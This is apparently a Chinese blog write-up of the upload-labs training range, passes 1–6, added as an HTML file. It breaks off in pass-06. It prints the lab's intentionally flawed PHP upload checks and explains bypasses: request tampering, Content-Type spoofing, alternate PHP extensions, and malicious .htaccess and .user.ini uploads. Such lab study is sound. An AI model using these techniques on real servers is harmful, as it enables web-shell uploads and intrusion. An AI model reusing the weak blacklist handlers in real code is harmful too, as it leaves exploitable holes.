@@ -1,0 +1,1052 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>upload-labs总结 - Lprvep</title><link rel="icon" type="image/png" href=icons/myicon.png /><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta property="og:title" content="upload-labs总结" />
+<meta property="og:description" content="前言 一直以来都没有做一个完全的总结" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.lprvep.com/posts/upload-labs-challenge/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2020-04-07T09:25:46&#43;08:00" />
+<meta property="article:modified_time" content="2020-04-07T09:25:46&#43;08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="upload-labs总结"/>
+<meta name="twitter:description" content="前言 一直以来都没有做一个完全的总结"/>
+<link href="https://fonts.googleapis.com/css?family=Ubuntu:300,400,300italic,400italic|Raleway:200,300" rel="stylesheet">
+
+	<link rel="stylesheet" type="text/css" media="screen" href="https://www.lprvep.com/css/normalize.css" />
+	<link rel="stylesheet" type="text/css" media="screen" href="https://www.lprvep.com/css/main.css" />
+	<link rel="stylesheet" type="text/css" href="https://www.lprvep.com/css/custom.css" />
+	<link rel="stylesheet" type="text/css" href="https://www.lprvep.com/css/dark.css" media="(prefers-color-scheme: dark)" />
+	<link rel="stylesheet" type="text/css" href="https://www.lprvep.com/css/custom-dark.css" media="(prefers-color-scheme: dark)" />
+
+	<script src="https://cdn.jsdelivr.net/npm/feather-icons/dist/feather.min.js"></script>
+	<script src="https://www.lprvep.com/js/main.js"></script>
+	<script src="https://www.lprvep.com/js/abc.js"></script>
+	<script src="https://www.lprvep.com/js/xyz.js"></script>
+	<script src="https://code.jquery.com/jquery-3.4.1.js"></script>
+</head>
+
+<body>
+	<div class="container wrapper post">
+		<div class="header">
+	<base href="https://www.lprvep.com/">
+	<h1 class="site-title"><a href="https://www.lprvep.com/">Lprvep</a></h1>
+	<div class="site-description"><h2>Web Security</h2><nav class="nav social">
+			<ul class="flat"><a href="https://github.com/godbless7" title="Github"><i data-feather="github"></i></a><a href="https://twitter.com/lprvep" title="Twitter"><i data-feather="twitter"></i></a><a href="/index.xml" title="RSS"><i data-feather="rss"></i></a></ul>
+		</nav>
+	</div>
+
+	<nav class="nav">
+		<ul class="flat">
+			
+			<li>
+				<a href="/">Home</a>
+			</li>
+			
+			<li>
+				<a href="/posts">All posts</a>
+			</li>
+			
+			<li>
+				<a href="/read">Read</a>
+			</li>
+			
+			<li>
+				<a href="/about">About</a>
+			</li>
+			
+			<li>
+				<a href="/tags">Tags</a>
+			</li>
+			
+			<li>
+				<a href="/avlist">Avlist</a>
+			</li>
+			
+		</ul>
+	</nav>
+</div>
+
+
+		<div class="post-header">
+			<h1 class="title">upload-labs总结</h1>
+			<div class="meta">Posted at &mdash; Apr 7, 2020</div>
+		</div>
+
+		<div class="markdown">
+			<h3 id="前言">前言</h3>
+<p>一直以来都没有做一个完全的总结</p>
+<p>所以有时候在实战中,会被懵到措手不及</p>
+<p>今天来重新学习总结一下</p>
+<p>这里用到的是c0ny师傅做的靶场</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">https://github.com/c0ny1/upload-labs
+</code></pre></div><p>本文观点均属于个人学习过程中的理解</p>
+<p>若有错误,望能指点一二 (:</p>
+<h3 id="知识点大纲">知识点大纲</h3>
+<p><img src="images/upload-labs-challenge/mind-map.png" alt="mind-map"></p>
+<p><img src="images/upload-labs-challenge/sum_up.png" alt="sum_up"></p>
+<h3 id="pass-01">pass-01</h3>
+<p>先直接上传个php试试</p>
+<p><img src="images/upload-labs-challenge/1-1.png" alt="1-1"></p>
+<p>提示文件类型不允许,查看下源码</p>
+<p>这是很明显的一个js前端的一个检测</p>
+<p><img src="images/upload-labs-challenge/1-2.png" alt="1-2"></p>
+<p>可以先上传一个允许上传的文件,然后通过burp来改包</p>
+<p>只需要将&quot;1.jpg&quot;==&gt;&ldquo;1.php&rdquo;,就可以实现上传</p>
+<p><img src="images/upload-labs-challenge/1-3.png" alt=""></p>
+<p>当然还有还有更简单的方法就是直接浏览器F12</p>
+<p>将对应的js的限制修改或者删除也能同样实现上传</p>
+<h3 id="pass-02">pass-02</h3>
+<p>还是一样先丢个php文件</p>
+<p><img src="images/upload-labs-challenge/2-1.png" alt="2-1"></p>
+<p>查看源码</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#719e07">if</span> (isset(<span style="color:#268bd2">$_POST</span>[<span style="color:#2aa198">&#39;submit&#39;</span>])) {
+    <span style="color:#719e07">if</span> (file_exists(UPLOAD_PATH)) {
+        <span style="color:#719e07">if</span> ((<span style="color:#268bd2">$_FILES</span>[<span style="color:#2aa198">&#39;upload_file&#39;</span>][<span style="color:#2aa198">&#39;type&#39;</span>] <span style="color:#719e07">==</span> <span style="color:#2aa198">&#39;image/jpeg&#39;</span>) <span style="color:#719e07">||</span> (<span style="color:#268bd2">$_FILES</span>[<span style="color:#2aa198">&#39;upload_file&#39;</span>][<span style="color:#2aa198">&#39;type&#39;</span>] <span style="color:#719e07">==</span> <span style="color:#2aa198">&#39;image/png&#39;</span>) <span style="color:#719e07">||</span> (<span style="color:#268bd2">$_FILES</span>[<span style="color:#2aa198">&#39;upload_file&#39;</span>][<span style="color:#2aa198">&#39;type&#39;</span>] <span style="color:#719e07">==</span> <span style="color:#2aa198">&#39;image/gif&#39;</span>)) {
+            <span style="color:#268bd2">$temp_file</span> <span style="color:#719e07">=</span> <span style="color:#268bd2">$_FILES</span>[<span style="color:#2aa198">&#39;upload_file&#39;</span>][<span style="color:#2aa198">&#39;tmp_name&#39;</span>];
+            <span style="color:#268bd2">$img_path</span> <span style="color:#719e07">=</span> UPLOAD_PATH <span style="color:#719e07">.</span> <span style="color:#2aa198">&#39;/&#39;</span> <span style="color:#719e07">.</span> <span style="color:#268bd2">$_FILES</span>[<span style="color:#2aa198">&#39;upload_file&#39;</span>][<span style="color:#2aa198">&#39;name&#39;</span>]            
+            <span style="color:#719e07">if</span> (move_uploaded_file(<span style="color:#268bd2">$temp_file</span>, <span style="color:#268bd2">$img_path</span>)) {
+                <span style="color:#268bd2">$is_upload</span> <span style="color:#719e07">=</span> <span style="color:#719e07">true</span>;
+            } <span style="color:#719e07">else</span> {
+                <span style="color:#268bd2">$msg</span> <span style="color:#719e07">=</span> <span style="color:#2aa198">&#39;上传出错！&#39;</span>;
+            }
+        } <span style="color:#719e07">else</span> {
+            <span style="color:#268bd2">$msg</span> <span style="color:#719e07">=</span> <span style="color:#2aa198">&#39;文件类型不正确，请重新上传！&#39;</span>;
+        }
+    }
+</code></pre></div><p>可以发现如果文件类型不是以下其中之一,就提示文件类型不正确</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">image<span style="color:#719e07">/</span>jpeg;image<span style="color:#719e07">/</span>png;image<span style="color:#719e07">/</span>gif
+</code></pre></div><p>所以这一关和后缀名无关,考察的是content-type的文件类型,即服务端MIME检测绕过</p>
+<p>burp抓包,然后将content-type的类型更改为上面的其中之一</p>
+<p><img src="images/upload-labs-challenge/2-2.png" alt="2-2"></p>
+<p>就可以成功上传</p>
+<p><img src="images/upload-labs-challenge/2-3.png" alt="2-3"></p>
+<h3 id="pass-03">pass-03</h3>
+<p><img src="images/upload-labs-challenge/3-1.png" alt="3-1"></p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#719e07">if</span> (isset(<span style="color:#268bd2">$_POST</span>[<span style="color:#2aa198">&#39;submit&#39;</span>])) {
+    <span style="color:#719e07">if</span> (file_exists(UPLOAD_PATH)) {
+        <span style="color:#268bd2">$deny_ext</span> <span style="color:#719e07">=</span> <span style="color:#719e07">array</span>(<span style="color:#2aa198">&#39;.asp&#39;</span>,<span style="color:#2aa198">&#39;.aspx&#39;</span>,<span style="color:#2aa198">&#39;.php&#39;</span>,<span style="color:#2aa198">&#39;.jsp&#39;</span>);
+        <span style="color:#268bd2">$file_name</span> <span style="color:#719e07">=</span> trim(<span style="color:#268bd2">$_FILES</span>[<span style="color:#2aa198">&#39;upload_file&#39;</span>][<span style="color:#2aa198">&#39;name&#39;</span>]);
+        <span style="color:#268bd2">$file_name</span> <span style="color:#719e07">=</span> deldot(<span style="color:#268bd2">$file_name</span>);<span style="color:#586e75">//删除文件名末尾的点
+</span><span style="color:#586e75"></span>        <span style="color:#268bd2">$file_ext</span> <span style="color:#719e07">=</span> strrchr(<span style="color:#268bd2">$file_name</span>, <span style="color:#2aa198">&#39;.&#39;</span>);
+        <span style="color:#268bd2">$file_ext</span> <span style="color:#719e07">=</span> strtolower(<span style="color:#268bd2">$file_ext</span>); <span style="color:#586e75">//转换为小写
+</span><span style="color:#586e75"></span>        <span style="color:#268bd2">$file_ext</span> <span style="color:#719e07">=</span> str_ireplace(<span style="color:#2aa198">&#39;::$DATA&#39;</span>, <span style="color:#2aa198">&#39;&#39;</span>, <span style="color:#268bd2">$file_ext</span>);<span style="color:#586e75">//去除字符串::$DATA
+</span><span style="color:#586e75"></span>        <span style="color:#268bd2">$file_ext</span> <span style="color:#719e07">=</span> trim(<span style="color:#268bd2">$file_ext</span>); <span style="color:#586e75">//收尾去空
+</span><span style="color:#586e75"></span>
+        <span style="color:#719e07">if</span>(<span style="color:#719e07">!</span>in_array(<span style="color:#268bd2">$file_ext</span>, <span style="color:#268bd2">$deny_ext</span>)) {
+            <span style="color:#268bd2">$temp_file</span> <span style="color:#719e07">=</span> <span style="color:#268bd2">$_FILES</span>[<span style="color:#2aa198">&#39;upload_file&#39;</span>][<span style="color:#2aa198">&#39;tmp_name&#39;</span>];
+            <span style="color:#268bd2">$img_path</span> <span style="color:#719e07">=</span> UPLOAD_PATH<span style="color:#719e07">.</span><span style="color:#2aa198">&#39;/&#39;</span><span style="color:#719e07">.</span>date(<span style="color:#2aa198">&#34;YmdHis&#34;</span>)<span style="color:#719e07">.</span>rand(<span style="color:#2aa198">1000</span>,<span style="color:#2aa198">9999</span>)<span style="color:#719e07">.</span><span style="color:#268bd2">$file_ext</span>;            
+            <span style="color:#719e07">if</span> (move_uploaded_file(<span style="color:#268bd2">$temp_file</span>,<span style="color:#268bd2">$img_path</span>)) {
+                 <span style="color:#268bd2">$is_upload</span> <span style="color:#719e07">=</span> <span style="color:#719e07">true</span>;
+            } <span style="color:#719e07">else</span> {
+                <span style="color:#268bd2">$msg</span> <span style="color:#719e07">=</span> <span style="color:#2aa198">&#39;上传出错！&#39;</span>;
+            }
+        } <span style="color:#719e07">else</span> {
+            <span style="color:#268bd2">$msg</span> <span style="color:#719e07">=</span> <span style="color:#2aa198">&#39;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#39;</span>;
+        }
+</code></pre></div><p>通过以上源码可以知道,只是限制了以下几个文件后缀不让上传,并且将文件重新命名</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#719e07">.</span>asp;<span style="color:#719e07">.</span>aspx;<span style="color:#719e07">.</span>php;<span style="color:#719e07">.</span>jsp
+</code></pre></div><p>所以可以使用以下的后缀来绕过(当然不止以下几个,更多的后缀可以参考下一关的限制)</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">phtml;php5;php3;phps;pht
+</code></pre></div><p><img src="images/upload-labs-challenge/3-2.png" alt="3-2"></p>
+<p>当然这一关换在生产环境中</p>
+<p>可能会出现不解析的情况,所以可能还会出现看运气的情况</p>
+<h3 id="pass-04">pass-04</h3>
+<p><img src="images/upload-labs-challenge/4-1.png" alt="4-1"></p>
+<p>这一关同样还是黑名单模式,并且是上一关的加强版,在限制名单上做了加强</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#719e07">if</span> (isset(<span style="color:#268bd2">$_POST</span>[<span style="color:#2aa198">&#39;submit&#39;</span>])) {
+    <span style="color:#719e07">if</span> (file_exists(UPLOAD_PATH)) {
+        <span style="color:#268bd2">$deny_ext</span> <span style="color:#719e07">=</span> <span style="color:#719e07">array</span>(<span style="color:#2aa198">&#34;.php&#34;</span>,<span style="color:#2aa198">&#34;.php5&#34;</span>,<span style="color:#2aa198">&#34;.php4&#34;</span>,<span style="color:#2aa198">&#34;.php3&#34;</span>,<span style="color:#2aa198">&#34;.php2&#34;</span>,<span style="color:#2aa198">&#34;.php1&#34;</span>,<span style="color:#2aa198">&#34;.html&#34;</span>,<span style="color:#2aa198">&#34;.htm&#34;</span>,<span style="color:#2aa198">&#34;.phtml&#34;</span>,<span style="color:#2aa198">&#34;.pht&#34;</span>,<span style="color:#2aa198">&#34;.pHp&#34;</span>,<span style="color:#2aa198">&#34;.pHp5&#34;</span>,<span style="color:#2aa198">&#34;.pHp4&#34;</span>,<span style="color:#2aa198">&#34;.pHp3&#34;</span>,<span style="color:#2aa198">&#34;.pHp2&#34;</span>,<span style="color:#2aa198">&#34;.pHp1&#34;</span>,<span style="color:#2aa198">&#34;.Html&#34;</span>,<span style="color:#2aa198">&#34;.Htm&#34;</span>,<span style="color:#2aa198">&#34;.pHtml&#34;</span>,<span style="color:#2aa198">&#34;.jsp&#34;</span>,<span style="color:#2aa198">&#34;.jspa&#34;</span>,<span style="color:#2aa198">&#34;.jspx&#34;</span>,<span style="color:#2aa198">&#34;.jsw&#34;</span>,<span style="color:#2aa198">&#34;.jsv&#34;</span>,<span style="color:#2aa198">&#34;.jspf&#34;</span>,<span style="color:#2aa198">&#34;.jtml&#34;</span>,<span style="color:#2aa198">&#34;.jSp&#34;</span>,<span style="color:#2aa198">&#34;.jSpx&#34;</span>,<span style="color:#2aa198">&#34;.jSpa&#34;</span>,<span style="color:#2aa198">&#34;.jSw&#34;</span>,<span style="color:#2aa198">&#34;.jSv&#34;</span>,<span style="color:#2aa198">&#34;.jSpf&#34;</span>,<span style="color:#2aa198">&#34;.jHtml&#34;</span>,<span style="color:#2aa198">&#34;.asp&#34;</span>,<span style="color:#2aa198">&#34;.aspx&#34;</span>,<span style="color:#2aa198">&#34;.asa&#34;</span>,<span style="color:#2aa198">&#34;.asax&#34;</span>,<span style="color:#2aa198">&#34;.ascx&#34;</span>,<span style="color:#2aa198">&#34;.ashx&#34;</span>,<span style="color:#2aa198">&#34;.asmx&#34;</span>,<span style="color:#2aa198">&#34;.cer&#34;</span>,<span style="color:#2aa198">&#34;.aSp&#34;</span>,<span style="color:#2aa198">&#34;.aSpx&#34;</span>,<span style="color:#2aa198">&#34;.aSa&#34;</span>,<span style="color:#2aa198">&#34;.aSax&#34;</span>,<span style="color:#2aa198">&#34;.aScx&#34;</span>,<span style="color:#2aa198">&#34;.aShx&#34;</span>,<span style="color:#2aa198">&#34;.aSmx&#34;</span>,<span style="color:#2aa198">&#34;.cEr&#34;</span>,<span style="color:#2aa198">&#34;.sWf&#34;</span>,<span style="color:#2aa198">&#34;.swf&#34;</span>,<span style="color:#2aa198">&#34;.ini&#34;</span>);
+        <span style="color:#268bd2">$file_name</span> <span style="color:#719e07">=</span> trim(<span style="color:#268bd2">$_FILES</span>[<span style="color:#2aa198">&#39;upload_file&#39;</span>][<span style="color:#2aa198">&#39;name&#39;</span>]);
+        <span style="color:#268bd2">$file_name</span> <span style="color:#719e07">=</span> deldot(<span style="color:#268bd2">$file_name</span>);<span style="color:#586e75">//删除文件名末尾的点
+</span><span style="color:#586e75"></span>        <span style="color:#268bd2">$file_ext</span> <span style="color:#719e07">=</span> strrchr(<span style="color:#268bd2">$file_name</span>, <span style="color:#2aa198">&#39;.&#39;</span>);
+        <span style="color:#268bd2">$file_ext</span> <span style="color:#719e07">=</span> strtolower(<span style="color:#268bd2">$file_ext</span>); <span style="color:#586e75">//转换为小写
+</span><span style="color:#586e75"></span>        <span style="color:#268bd2">$file_ext</span> <span style="color:#719e07">=</span> str_ireplace(<span style="color:#2aa198">&#39;::$DATA&#39;</span>, <span style="color:#2aa198">&#39;&#39;</span>, <span style="color:#268bd2">$file_ext</span>);<span style="color:#586e75">//去除字符串::$DATA
+</span><span style="color:#586e75"></span>        <span style="color:#268bd2">$file_ext</span> <span style="color:#719e07">=</span> trim(<span style="color:#268bd2">$file_ext</span>); <span style="color:#586e75">//收尾去空
+</span><span style="color:#586e75"></span>
+        <span style="color:#719e07">if</span> (<span style="color:#719e07">!</span>in_array(<span style="color:#268bd2">$file_ext</span>, <span style="color:#268bd2">$deny_ext</span>)) {
+            <span style="color:#268bd2">$temp_file</span> <span style="color:#719e07">=</span> <span style="color:#268bd2">$_FILES</span>[<span style="color:#2aa198">&#39;upload_file&#39;</span>][<span style="color:#2aa198">&#39;tmp_name&#39;</span>];
+            <span style="color:#268bd2">$img_path</span> <span style="color:#719e07">=</span> UPLOAD_PATH<span style="color:#719e07">.</span><span style="color:#2aa198">&#39;/&#39;</span><span style="color:#719e07">.</span><span style="color:#268bd2">$file_name</span>;
+            <span style="color:#719e07">if</span> (move_uploaded_file(<span style="color:#268bd2">$temp_file</span>, <span style="color:#268bd2">$img_path</span>)) {
+                <span style="color:#268bd2">$is_upload</span> <span style="color:#719e07">=</span> <span style="color:#719e07">true</span>;
+            } <span style="color:#719e07">else</span> {
+                <span style="color:#268bd2">$msg</span> <span style="color:#719e07">=</span> <span style="color:#2aa198">&#39;上传出错！&#39;</span>;
+            }
+        } <span style="color:#719e07">else</span> {
+            <span style="color:#268bd2">$msg</span> <span style="color:#719e07">=</span> <span style="color:#2aa198">&#39;此文件不允许上传!&#39;</span>;
+        }
+</code></pre></div><p>但是这关与上关的不同点就是,它不会将你上传的文件名重命名为随机数</p>
+<p><img src="images/upload-labs-challenge/4-2.png" alt="4-2"></p>
+<p>上传后依旧是你上传文件的名字,所以这关可以使用**.htaccess**文件让所有文件都按照php来解析</p>
+<p>(这里是在Apache环境下测试,其他中间件咱不考究)</p>
+<p><strong>.htaccess</strong>内容</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">SetHandler application<span style="color:#719e07">/</span>x<span style="color:#719e07">-</span>httpd<span style="color:#719e07">-</span>php
+</code></pre></div><p>将此文件上传后再去访问刚刚得1.jpg</p>
+<p><img src="images/upload-labs-challenge/4-3.png" alt="4-3"></p>
+<h3 id="pass-05">pass-05</h3>
+<p>依旧是黑名单</p>
+<p>限制了**.htaccess**文件</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#719e07">if</span> (isset(<span style="color:#268bd2">$_POST</span>[<span style="color:#2aa198">&#39;submit&#39;</span>])) {
+    <span style="color:#719e07">if</span> (file_exists(UPLOAD_PATH)) {
+        <span style="color:#268bd2">$deny_ext</span> <span style="color:#719e07">=</span> <span style="color:#719e07">array</span>(<span style="color:#2aa198">&#34;.php&#34;</span>,<span style="color:#2aa198">&#34;.php5&#34;</span>,<span style="color:#2aa198">&#34;.php4&#34;</span>,<span style="color:#2aa198">&#34;.php3&#34;</span>,<span style="color:#2aa198">&#34;.php2&#34;</span>,<span style="color:#2aa198">&#34;.html&#34;</span>,<span style="color:#2aa198">&#34;.htm&#34;</span>,<span style="color:#2aa198">&#34;.phtml&#34;</span>,<span style="color:#2aa198">&#34;.pht&#34;</span>,<span style="color:#2aa198">&#34;.pHp&#34;</span>,<span style="color:#2aa198">&#34;.pHp5&#34;</span>,<span style="color:#2aa198">&#34;.pHp4&#34;</span>,<span style="color:#2aa198">&#34;.pHp3&#34;</span>,<span style="color:#2aa198">&#34;.pHp2&#34;</span>,<span style="color:#2aa198">&#34;.Html&#34;</span>,<span style="color:#2aa198">&#34;.Htm&#34;</span>,<span style="color:#2aa198">&#34;.pHtml&#34;</span>,<span style="color:#2aa198">&#34;.jsp&#34;</span>,<span style="color:#2aa198">&#34;.jspa&#34;</span>,<span style="color:#2aa198">&#34;.jspx&#34;</span>,<span style="color:#2aa198">&#34;.jsw&#34;</span>,<span style="color:#2aa198">&#34;.jsv&#34;</span>,<span style="color:#2aa198">&#34;.jspf&#34;</span>,<span style="color:#2aa198">&#34;.jtml&#34;</span>,<span style="color:#2aa198">&#34;.jSp&#34;</span>,<span style="color:#2aa198">&#34;.jSpx&#34;</span>,<span style="color:#2aa198">&#34;.jSpa&#34;</span>,<span style="color:#2aa198">&#34;.jSw&#34;</span>,<span style="color:#2aa198">&#34;.jSv&#34;</span>,<span style="color:#2aa198">&#34;.jSpf&#34;</span>,<span style="color:#2aa198">&#34;.jHtml&#34;</span>,<span style="color:#2aa198">&#34;.asp&#34;</span>,<span style="color:#2aa198">&#34;.aspx&#34;</span>,<span style="color:#2aa198">&#34;.asa&#34;</span>,<span style="color:#2aa198">&#34;.asax&#34;</span>,<span style="color:#2aa198">&#34;.ascx&#34;</span>,<span style="color:#2aa198">&#34;.ashx&#34;</span>,<span style="color:#2aa198">&#34;.asmx&#34;</span>,<span style="color:#2aa198">&#34;.cer&#34;</span>,<span style="color:#2aa198">&#34;.aSp&#34;</span>,<span style="color:#2aa198">&#34;.aSpx&#34;</span>,<span style="color:#2aa198">&#34;.aSa&#34;</span>,<span style="color:#2aa198">&#34;.aSax&#34;</span>,<span style="color:#2aa198">&#34;.aScx&#34;</span>,<span style="color:#2aa198">&#34;.aShx&#34;</span>,<span style="color:#2aa198">&#34;.aSmx&#34;</span>,<span style="color:#2aa198">&#34;.cEr&#34;</span>,<span style="color:#2aa198">&#34;.sWf&#34;</span>,<span style="color:#2aa198">&#34;.swf&#34;</span>,<span style="color:#2aa198">&#34;.htaccess&#34;</span>);
+        <span style="color:#268bd2">$file_name</span> <span style="color:#719e07">=</span> trim(<span style="color:#268bd2">$_FILES</span>[<span style="color:#2aa198">&#39;upload_file&#39;</span>][<span style="color:#2aa198">&#39;name&#39;</span>]);
+        <span style="color:#268bd2">$file_name</span> <span style="color:#719e07">=</span> deldot(<span style="color:#268bd2">$file_name</span>);<span style="color:#586e75">//删除文件名末尾的点
+</span><span style="color:#586e75"></span>        <span style="color:#268bd2">$file_ext</span> <span style="color:#719e07">=</span> strrchr(<span style="color:#268bd2">$file_name</span>, <span style="color:#2aa198">&#39;.&#39;</span>);
+        <span style="color:#268bd2">$file_ext</span> <span style="color:#719e07">=</span> strtolower(<span style="color:#268bd2">$file_ext</span>); <span style="color:#586e75">//转换为小写
+</span><span style="color:#586e75"></span>        <span style="color:#268bd2">$file_ext</span> <span style="color:#719e07">=</span> str_ireplace(<span style="color:#2aa198">&#39;::$DATA&#39;</span>, <span style="color:#2aa198">&#39;&#39;</span>, <span style="color:#268bd2">$file_ext</span>);<span style="color:#586e75">//去除字符串::$DATA
+</span><span style="color:#586e75"></span>        <span style="color:#268bd2">$file_ext</span> <span style="color:#719e07">=</span> trim(<span style="color:#268bd2">$file_ext</span>); <span style="color:#586e75">//首尾去空
+</span><span style="color:#586e75"></span>        
+        <span style="color:#719e07">if</span> (<span style="color:#719e07">!</span>in_array(<span style="color:#268bd2">$file_ext</span>, <span style="color:#268bd2">$deny_ext</span>)) {
+            <span style="color:#268bd2">$temp_file</span> <span style="color:#719e07">=</span> <span style="color:#268bd2">$_FILES</span>[<span style="color:#2aa198">&#39;upload_file&#39;</span>][<span style="color:#2aa198">&#39;tmp_name&#39;</span>];
+            <span style="color:#268bd2">$img_path</span> <span style="color:#719e07">=</span> UPLOAD_PATH<span style="color:#719e07">.</span><span style="color:#2aa198">&#39;/&#39;</span><span style="color:#719e07">.</span><span style="color:#268bd2">$file_name</span>;
+            <span style="color:#719e07">if</span> (move_uploaded_file(<span style="color:#268bd2">$temp_file</span>, <span style="color:#268bd2">$img_path</span>)) {
+                <span style="color:#268bd2">$is_upload</span> <span style="color:#719e07">=</span> <span style="color:#719e07">true</span>;
+            } <span style="color:#719e07">else</span> {
+                <span style="color:#268bd2">$msg</span> <span style="color:#719e07">=</span> <span style="color:#2aa198">&#39;上传出错！&#39;</span>;
+            }
+        } <span style="color:#719e07">else</span> {
+            <span style="color:#268bd2">$msg</span> <span style="color:#719e07">=</span> <span style="color:#2aa198">&#39;此文件类型不允许上传！&#39;</span>;
+        }
+</code></pre></div><p>对比了上一关,这关少了个**.ini**的限制</p>
+<p>利用方法可以参考下P师傅的上古文章</p>
+<p><a href="https://www.leavesongs.com/PENETRATION/php-user-ini-backdoor.html">https://www.leavesongs.com/PENETRATION/php-user-ini-backdoor.html</a></p>
+<p>这一关在c0ny师傅提供的docker中并不能成功bypass</p>
+<p>P师傅的文章中也有提到必须要是以fastcgi运行的php才可以</p>
+<p>并且需要该目录下有正常的php文件</p>
+<p>所以这里我使用了phpstudy+php7.3.4</p>
+<p>需要以下两个文件,依次上传</p>
+<p><img src="images/upload-labs-challenge/5-1.png" alt="5-1"></p>
+<p>然后去访问原本该目录就存在的readme.php</p>
+<p><img src="images/upload-labs-challenge/5-2.png" alt="5-2"></p>
+<p><img src="images/upload-labs-challenge/5-3.png" alt="5-3"></p>
+<p>其中**.user.ini**文件中**auto_prepend_file**的意思大概就是在运行某个php时自动包含指定的文件</p>
+<p>以下是php官网中的解释</p>
+<p><img src="images/upload-labs-challenge/5-4.png" alt="5-4"></p>
+<h3 id="pass-06">pass-06</h3>
+<p>这一关还是是黑名单</p>
+<p>并且**.htaccess和.user.ini**都被加上了</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#719e07">if</span> (isset(<span style="color:#268bd2">$_POST</span>[<span style="color:#2aa198">&#39;submit&#39;</span>])) {
+    <span style="color:#719e07">if</span> (file_exists(UPLOAD_PATH)) {
+        <span style="color:#268bd2">$deny_ext</span> <span style="color:#719e07">=</span> <span style="color:#719e07">array</span>(<span style="color:#2aa198">&#34;.php&#34;</span>,<span style="color:#2aa198">&#34;.php5&#34;</span>,<span style="color:#2aa198">&#34;.php4&#34;</span>,<span style="color:#2aa198">&#34;.php3&#34;</span>,<span style="color:#2aa198">&#34;.php2&#34;</span>,<span style="color:#2aa198">&#34;.html&#34;</span>,<span style="color:#2aa198">&#34;.htm&#34;</span>,<span style="color:#2aa198">&#34;.phtml&#34;</span>,<span style="color:#2aa198">&#34;.pht&#34;</span>,<span style="color:#2aa198">&#34;.pHp&#34;</span>,<span style="color:#2aa198">&#34;.pHp5&#34;</span>,<span style="color:#2aa198">&#34;.pHp4&#34;</span>,<span style="color:#2aa198">&#34;.pHp3&#34;</span>,<span style="color:#2aa198">&#34;.pHp2&#34;</span>,<span style="color:#2aa198">&#34;.Html&#34;</span>,<span style="color:#2aa198">&#34;.Htm&#34;</span>,<span style="color:#2aa198">&#34;.pHtml&#34;</span>,<span style="color:#2aa198">&#34;.jsp&#34;</span>,<span style="color:#2aa198">&#34;.jspa&#34;</span>,<span style="color:#2aa198">&#34;.jspx&#34;</span>,<span style="color:#2aa198">&#34;.jsw&#34;</span>,<span style="color:#2aa198">&#34;.jsv&#34;</span>,<span style="color:#2aa198">&#34;.jspf&#34;</span>,<span style="color:#2aa198">&#34;.jtml&#34;</span>,<span style="color:#2aa198">&#34;.jSp&#34;</span>,<span style="color:#2aa198">&#34;.jSpx&#34;</span>,<span style="color:#2aa198">&#34;.jSpa&#34;</span>,<span style="color:#2aa198">&#34;.jSw&#34;</span>,<span style="color:#2aa198">&#34;.jSv&#34;</span>,<span style="color:#2aa198">&#34;.jSpf&#34;</span>,<span style="color:#2aa198">&#34;.jHtml&#34;</span>,<span style="color:#2aa198">&#34;.asp&#34;</span>,<span style="color:#2aa198">&#34;.aspx&#34;</span>,<span style="color:#2aa198">&#34;.asa&#34;</span>,<span style="color:#2aa198">&#34;.asax&#34;</span>,<span style="color:#2aa198">&#34;.ascx&#34;</span>,<span style="color:#2aa198">&#34;.ashx&#34;</span>,<span style="color:#2aa198">&#34;.asmx&#34;</span>,<span style="color:#2aa198">&#34;.cer&#34;</span>,<span style="color:#2aa198">&#34;.aSp&#34;</span>,<span style="color:#2aa198">&#34;.aSpx&#34;</span>,<span style="color:#2aa198">&#34;.aSa&#34;</span>,<span style="color:#2aa198">&#34;.aSax&#34;</span>,<span style="color:#2aa198">&#34;.aScx&#34;</span>,<span style="color:#2aa198">&#34;.aShx&#34;</span>,<span style="color:#2aa198">&#34;.aSmx&#34;</span>,<span style="color:#2aa198">&#34;.cEr&#34;</span>,<span style="color:#2aa198">&#34;.sWf&#34;</span>,<span style="color:#2aa198">&#34;.swf&#34;</span>,<span style="color:#2aa198">&#34;.htaccess&#34;</span>,<span style="color:#2aa198">&#34;.ini&#34;</span>);
+        <span style="color:#268bd2">$file_name</span> <span style="color:#719e07">=</span> trim(<span style="color:#268bd2">$_FILES</span>[<span style="color:#2aa198">&#39;upload_file&#39;</span>][<span style="color:#2aa198">&#39;name&#39;</span>]);
+        <span style="color:#268bd2">$file_name</span> <span style="color:#719e07">=</span> deldot(<span style="color:#268bd2">$file_name</span>);<span style="color:#586e75">//删除文件名末尾的点
